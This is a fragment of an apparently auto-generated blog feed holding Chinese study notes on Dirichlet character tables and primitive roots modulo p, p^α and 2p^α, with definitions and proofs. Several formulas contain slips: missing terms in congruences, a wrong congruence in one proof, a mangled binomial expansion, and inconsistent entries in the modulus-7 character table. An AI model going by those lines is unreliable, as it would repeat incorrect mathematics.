&lt;li&gt;
&lt;p&gt;&lt;strong&gt;k=4,$\varphi(k)=2$:&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;n&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;1&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;2&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;3&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;4&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\chi_1(n)$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\chi_2(n)$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;-1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;k=5,$\varphi(k)=4$:&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;n&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;1&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;2&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;3&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;4&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;5&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\chi_1(n)$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\chi_2(n)$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;-1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;-1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\chi_3(n)$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;i&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;-i&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;-1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\chi_4(n)$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;-i&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;i&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;-1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;k=6,$\varphi(k)=2$:&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;n&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;1&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;2&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;3&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;4&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;5&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;6&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\chi_1(n)$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\chi_2(n)$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;-1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;k=7,$\varphi(k)=6$:&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;n&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;1&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;2&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;3&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;4&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;5&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;6&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;7&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\chi_1(n)$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\chi_2(n)$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;-1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;-1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;-1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\chi_3(n)$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$w^2$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$w$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$-w$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$-w^2$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;-1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\chi_4(n)$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$w^2$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$-w$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$-w$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$w^2$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\chi_5(n)$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$-w$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$w^2$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$w^2$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$-w$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\chi_6(n)$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$-w$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$-w^2$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$w^2$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$w$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;-1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>解析数论之原根</title>
        <link>https://dorinxl.github.io/p/%E8%A7%A3%E6%9E%90%E6%95%B0%E8%AE%BA%E4%B9%8B%E5%8E%9F%E6%A0%B9/</link>
        <pubDate>Wed, 02 Aug 2023 15:13:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E8%A7%A3%E6%9E%90%E6%95%B0%E8%AE%BA%E4%B9%8B%E5%8E%9F%E6%A0%B9/</guid>
        <description>&lt;h1 id=&#34;解析数论之原根&#34;&gt;解析数论之原根
&lt;/h1&gt;


&lt;div class=&#34;notice notice-info&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34; fill=&#34;hsl(30, 80%, 70%)&#34;&gt;&lt;path d=&#34;M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v100h12c7 0 12 5 12 12v24z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;本文使用&lt;strong&gt;Typora&lt;/strong&gt;编写，但Hugo使用&lt;strong&gt;KaTex&lt;/strong&gt;渲染，可能会出现不兼容状态，如需最佳体验请前往&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/DorinXL/p/17602094.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;这里&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;

&lt;h2 id=&#34;目录&#34;&gt;目录
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Chapter1 什么是整数的次数，什么是原根&lt;/li&gt;
&lt;li&gt;Chapter2 谁有原根？&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chapter1-什么是整数的次数什么是原根&#34;&gt;Chapter1 什么是整数的次数，什么是原根
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Definition&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;对于$(a,m)=1,m\ge1$，考虑所有$a,a^2,a^3,\cdots$，我们通过欧拉定理知道有$a^{\varphi(m)}\equiv1\mod{m}$。&lt;/p&gt;
&lt;p&gt;而满足$a^f\equiv1\mod{m}$的最小正整数$f$称为$a\mod{m}$的次数，记作
$$
f=\exp_m(a)
$$
如果$\exp_m(a)=\varphi(m)$,那么$a$叫做模$m$的一个原根。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;**Th1：**如果$\exp_m(a)=l;a^n\equiv1\mod{m};n$是正整数，那么$l|n$。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;使用反证法，如果$l$不能整除$n$，那么有$n=ql+r,0\le r\le l$，那么
$$
a^n\equiv a^{ql+r}\equiv1\mod{m} \newline
而\exp_m(a)=l意味着a^l\equiv1\mod{m} \newline
所以a^{ql+r}\equiv a^r\equiv1\mod{m} \newline
$$
在上面的式子中$0\le r\le l$，但是根据$\exp_m(a)=l$的定义，不可能存在$0&amp;lt; r\le l$的数r使$a^r\equiv1\mod{m}$，出现矛盾，于是反证成功。&lt;/p&gt;
&lt;p&gt;或者$r=0$，这样一来就会出现$l|n$。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;推论：如果$\exp_m(a)=l$，一定有$l|\varphi(m)$&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;**Th2：**如果$\exp_m(a)=l$，那么${1,a,a^2,\cdots,a^{l-1}}$中的元素两两不同余&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;假设$a^m\equiv a^n\mod{m}, 0\le n\le m\le l-1$，那么根据$(a,m)=1$，我们有$a^{m-n} \equiv 1\mod{m}$，但是$0\le m-n \le l-1$，出现矛盾，反证成功。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;**Th3：**如果$\exp_m(a)=l$，那么$a^k\equiv a^h\mod{m}$，当且仅当$k \equiv h\mod{l}$。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;证明$\Rightarrow$：&lt;/p&gt;
&lt;p&gt;如果$a^k\equiv a^h\mod{m}$，那么根据$(a,m)=1$有$a^{k-h}\equiv1\mod{m}$。&lt;/p&gt;
&lt;p&gt;根据Th1有$k-h=ql+r,0\le r\le l$，使用Th1的方式我们可以推导出$r=0$，从而有$k-h=ql \Rightarrow l|(k-h) \Rightarrow k\equiv h\mod{l}$&lt;/p&gt;
&lt;p&gt;证明$\Leftarrow$：&lt;/p&gt;
&lt;p&gt;如果$k\equiv h\mod{l}$，那么$k-h=ql$，所以$a^{k-h}\equiv1\mod{m}$，于是$a^k\equiv a^h\mod{m}$。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Th3还可以用于证明Th2，$k$和$h$选自${0,1,2\cdots,l-1}$中的不同元素，于是${1,a,a^2,\cdots,a^{l-1}}$中的元素两两互不同余。&lt;/p&gt;
&lt;p&gt;推论：如果$\exp_m(a)=l$，那么$a^k\equiv 1\mod{m}$，当且仅当$k \equiv 0\mod{f}$。所以有$l|\varphi(m)$&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;**Th4：**令$(a.m)=1$，则$a$是模$m$的一个原根，当且仅当，${a,a^2,\cdots,a^{\varphi(m)}}$构成模$m$的一个简化剩余系。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;证明$\Rightarrow$：&lt;/p&gt;
&lt;p&gt;如果$a$是一个原根，那么有$a^{\varphi(m)} \equiv \mod{m}$,那么根据Th2，我们有${1,a,a^2,\cdots,a^{\varphi(m)-1}}$，即${a,a^2,\cdots,a^{\varphi(m)}}$两两互不同余，而这样的数正好有$\varphi(m)$个，于是构成$m$的一个简化剩余系。&lt;/p&gt;
&lt;p&gt;证明$\Leftarrow$：&lt;/p&gt;
&lt;p&gt;有$(a,m)=1$，那么根据欧拉定理有$a^{\varphi(m)} \equiv \mod{m}$，而${a,a^2,\cdots,a^{\varphi(m)}}$构成简化剩余系，且其中的元素两两互不同余，那么不会出现比$\varphi(m)$更小的方幂同余1。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;**Th5：**已知$(a.m)=1$，令$\exp_m(a)=f$，则有
$$
\exp_m(a^k)=\dfrac{\exp_m(a)}{(k,f)}
$$
特别的，$\exp_m(a^k)=\exp_m(a)$当且仅当$(k,f)=1$。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;从定义我们知道，$\exp_m(a^k)$即是$a^k$的次数，也就是满足$a^{xk}\equiv1\mod{m}$的最小的$x$，使$xk\equiv1\mod{f}$。&lt;/p&gt;
&lt;p&gt;$xk\equiv1\mod{f}$等价于$x\equiv0\mod{\dfrac{f}{d}}，d=(k,f)$。这个同余式的最小正整数解为$x=\dfrac{f}{d}$，所以$\exp_m(a^k)=\dfrac{f}{d}=\dfrac{\exp_m(a)}{(k,f)}$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;**Th6：**令$g$是模$p$的一个原根，使$g^{p-1}\not\equiv1(\mod{p^2})$，那么对每个$\alpha\ge2$，我们有$g^{\varphi(p^{\alpha-1})}\not\equiv1(\mod{p^\alpha})$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;使用归纳法证明，对$\alpha=2$，左式就是右式。&lt;/p&gt;
&lt;p&gt;假设该定理对$\alpha={2，\cdots,}n$都成立，现在我们要证明对于$\alpha=n+1$也成立。&lt;/p&gt;
&lt;p&gt;根据欧拉定理，我们有$g^{\varphi(p^{\alpha-1})}\equiv1(\mod{p^{\alpha-1}})$，因此$g^{\varphi(p^{\alpha-1})}=kp^{\alpha-1}+1$。&lt;/p&gt;
&lt;p&gt;而对于$\alpha=n$满足$g^{\varphi(p^{\alpha-1})}\not\equiv1(\mod{p^\alpha})$，也就是$g^{\varphi(p^{\alpha-1})}-1\not\equiv0(\mod{p^\alpha})$,也就是$k$的因子不能含有$p$，即$p\not|k$。&lt;/p&gt;
&lt;p&gt;接着我们将$g^{\varphi(p^{\alpha-1})}=kp^{\alpha-1}+1$左右各自乘$p$次：
$$
\begin{align*}
(g^{\varphi(p^{\alpha-1})})^p&amp;amp;=(kp^{\alpha-1}+1)^p \newline
(g^{p^{\alpha-1}-p^{\alpha-2}})^p&amp;amp;=1+kp^\alpha+k^2\dfrac{p(p-1)}{2}p^{2(\alpha-1)+rp^{3(\alpha-1)}} \newline
因为\alpha\ge2,所以&amp;amp;2\alpha-1\ge\alpha+1,3\alpha-3\ge\alpha+1 \newline
g^{\varphi(p^\alpha)}&amp;amp;\equiv1+kp^\alpha(\mod{p^{\alpha+1}})
\end{align*}
$$
而前面证明了$k$中不含因子$p$，所以$kp^\alpha\not\equiv0(\mod{p^{\alpha+1}})$，所以$g^{\varphi(p^\alpha)}-1\not\equiv0(\mod{p^{\alpha+1}})$。&lt;/p&gt;
&lt;p&gt;所以我们证明了对于$\alpha=n+1$这个结论也成立，归纳证明完毕。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chapter2-谁有原根&#34;&gt;Chapter2 谁有原根？
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Definition&lt;/strong&gt;：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;不是所有的模都有原根：&lt;/p&gt;
&lt;p&gt;只有当$m=1,2,4,p^\alpha,2p^\alpha$的时候，模才有原根。&lt;/p&gt;
&lt;p&gt;前三种情形容易确定：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1的原根是0，2的原根是1，4的原根3：$3^2\equiv 1 \mod{4}$。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;1.证明对奇素数$p$，模$p$的原根存在：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Th：令$p$是一个奇素数，$d|p-1$，在模$p$的每一个简化剩余系中，恰有$\varphi(d)$个$a$使得$\exp_p(a)=d$。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;使用在第二章中用到过的证明，将$d$分为若干个集合$A(d)={x|1\le x\le p-1,\exp_p(x)=d}$&lt;/p&gt;
&lt;p&gt;令$f(d)$表示$A(d)$中元素的个数。对每一个$d$有$f(d)\ge0$，我们要证明$f(d)=\varphi(d)$&lt;/p&gt;
&lt;p&gt;首先，$A(d)$是互不相交的，所以$\sum_{d|p-1}f(d)=p-1$&lt;/p&gt;
&lt;p&gt;然后，根据欧拉函数的性质，我们有$\sum_{d|p-1}\varphi(d)=p-1$&lt;/p&gt;
&lt;p&gt;于是有$\sum_{d|p-1}|\varphi(d)-f(d)|=0$，&lt;/p&gt;
&lt;p&gt;其中每一项加起来的和为0，所以我们要证明有$f(d)\ge\varphi(d)$就足够了。&lt;/p&gt;
&lt;p&gt;如果$f(d)=0$，那么显然满足$f(d)\ge\varphi(d)$；&lt;/p&gt;
&lt;p&gt;如果$f(d)\not=0$，也就是$A(d)$非空，那么从$A(d)$中选取一个$a$，满足$\exp_p(a)=d$，即$a^d\equiv1(\mod{p})$&lt;/p&gt;
&lt;p&gt;对于选择的这个$a$来说，他的任意方幂都满足$a^d\equiv1(\mod{p})$，也就是说&lt;/p&gt;
&lt;p&gt;${a,a^2,\cdots,a^d}$都是$x^d-1\equiv0(\mod{p})$的解。&lt;/p&gt;
&lt;p&gt;根据拉格朗日定理，$p$是素数，那么上面这个式子最多只有$d$个解，于是${a,a^2,\cdots,a^d}$是$x^d-1\equiv0(\mod{p})$的&lt;strong&gt;全部&lt;/strong&gt;解。&lt;/p&gt;
&lt;p&gt;于是我们扩大范围，既然$A(d)$不为空，那么$A(d)$这个集合中的所有数${1\le a \le p-1}$，都有$a^k,k=1,2,\cdots$&lt;/p&gt;
&lt;p&gt;但不是所有的$a^k$都满足$(a^k)^d\equiv1(\mod{p})$，我们要找到有多少这样的$a$能够满足这个式子。&lt;/p&gt;
&lt;p&gt;换言之，什么时候$\exp_p(a^k)=d$呢？&lt;/p&gt;
&lt;p&gt;我们有Th5的推论可以知道，想要$\exp_p(a^k)=\exp_p(a)=d$，那就需要$(k,d)=1$。&lt;/p&gt;
&lt;p&gt;换言之，${a,a^2,\cdots,a^d}$中只有$\varphi(d)$个数，满足$(a^k)^d\equiv1(\mod{p})$.&lt;/p&gt;
&lt;p&gt;所以，在模$p$的每一个简化剩余系中，恰有$\varphi(d)$个$a$使得$\exp_p(a)=d$。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;2.证明对模$p^\alpha$的原根存在：&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;令$p$是一个奇素数，则有：&lt;/p&gt;
&lt;p&gt;1）如果$g$是模$p$的一个原根，那么对所有的$\alpha\ge1$，$g$是模$p^\alpha$的原根 $\Leftrightarrow$ $g^{p-1}\not\equiv1(\mod{p^2})$&lt;/p&gt;
&lt;p&gt;2）模$p$至少有一个原根$g$满足$g^{p-1}\not\equiv1(\mod{p^2})$，于是当$\alpha\ge2$的时候，模$p^\alpha$至少有一个原根。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;证明2）：&lt;/p&gt;
&lt;p&gt;令$g$是模$p$的一个原根，有$g^\varphi(p)\equiv1(\mod{p})$&lt;/p&gt;
&lt;p&gt;如果$g^{p-1}\equiv1(\mod{p^2})$，我们能证明有另一个原根$g_1=g+p$满足$g_1^{p-1}\not\equiv1(\mod{p^2})$&lt;/p&gt;
&lt;p&gt;我们展开$g_1^{p-1}$：
$$
g_1^{p-1}=(g+p)^{p-1}=g^{p-1}+(p-1)g^{p-2}p+tp^2 \newline
\equiv g^{p-1}+(p^2-p)g^{p-2}(\mod{p^2}) \newline
\equiv 1-pg^{p-2}(\mod{p^2})
$$
不能有$pg^{p-2}\equiv0(\mod{p^2}) $，因为这样会出现$g^{p-2}\equiv0(\mod{p})$与$g$是模$p$的一个原根矛盾。&lt;/p&gt;
&lt;p&gt;于是$g_1^{p-1}\not\equiv1(\mod{p^2})$。&lt;/p&gt;
&lt;p&gt;证明1）：$\Rightarrow$&lt;/p&gt;
&lt;p&gt;如果$g$是模$p$的一个原根，那么对所有的$\alpha\ge1$，$g$是模$p^\alpha$的原根.&lt;/p&gt;
&lt;p&gt;那么我们让$\alpha=2$，就满足b的定义。&lt;/p&gt;
&lt;p&gt;反过来，$g$是模$p$的一个原根，$g^{p-1}\not\equiv1(\mod{p^2})$。要证明$g$是模$p^\alpha$的原根：&lt;/p&gt;
&lt;p&gt;令$t=\exp_{p^\alpha}(g)$，现在要证明$t=\varphi(p^\alpha)$&lt;/p&gt;
&lt;p&gt;因为$g^t\equiv1(\mod{p^\alpha})$，我们有$g^t\equiv1(\mod{p})$，所以$\varphi(p)|t,t=q\varphi(p)$&lt;/p&gt;
&lt;p&gt;而$t|\varphi(p^\alpha)$，所以$q\varphi(p)|\varphi(p^\alpha)=p^{\alpha-1}(p-1)$，所以$q(p-1)|p^{\alpha-1}(p-1),q|p^{\alpha-1}$，所以$q=p^\beta,(\beta\le\alpha-1)$&lt;/p&gt;
&lt;p&gt;于是$t=q\varphi(p)=p^\beta(p-1)$&lt;/p&gt;
&lt;p&gt;如果我们能证明$\beta=\alpha-1$，那么就是说$t=p^{\alpha-1}(p-1)=\varphi(p^{\alpha})$&lt;/p&gt;
&lt;p&gt;假设法证明，如果$\beta&amp;lt;\alpha-1$，那么$\beta\le\alpha-2，t=p^\beta(p-1)|p^{\alpha-2}(p-1)=\varphi(p^{\alpha-1})$&lt;/p&gt;
&lt;p&gt;我们有$t=\exp_{p^\alpha}(g)$，而$\varphi(p^{\alpha-1})$是$t$的倍数，所以$g^{\varphi(p^{\alpha-1})}\equiv1(\mod{p^\alpha})$&lt;/p&gt;
&lt;p&gt;Th6证明了这个式子是不成立的，所以出现矛盾，证明完毕。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;模$2p^\alpha$的原根存在：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果$p$是一个奇素数并且$\alpha\ge1$，那么存在模$p^\alpha$的一个奇数原根$g$，每一个这样的$g$也是模$2p^\alpha$的原根。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;如果$g$是模$p^\alpha$的一个原根，那么$g+p^\alpha$也是一个原根。$g$和$g+p^\alpha$必有一个是奇数。所以必然存在奇数原根。&lt;/p&gt;
&lt;p&gt;令$g$是模$p^\alpha$的一个奇数原根，令$f=\exp_{2p^\alpha}(g)$，有$f|\varphi(2p^\alpha)$，现在要证明$f=\varphi(2p^\alpha)$。&lt;/p&gt;
&lt;p&gt;$\varphi(2p^\alpha)=\varphi(2)\varphi(p^\alpha)=\varphi(p^\alpha)$，所以$f|\varphi(p^\alpha)$，证明$f=\varphi(2p^\alpha)$变成了证明$f=\exp_{p^\alpha}(g)$。&lt;/p&gt;
&lt;p&gt;而$g^f\equiv1(\mod{2p^\alpha})$，所以$g^f\equiv1(\mod{p^\alpha})$。(定义)&lt;/p&gt;
&lt;p&gt;所以根据Th1：$\varphi(p^\alpha)|f$。&lt;/p&gt;
&lt;p&gt;所以$f=\varphi(p^\alpha)=\varphi(2p^\alpha)$&lt;/p&gt;
&lt;/blockquote&gt;
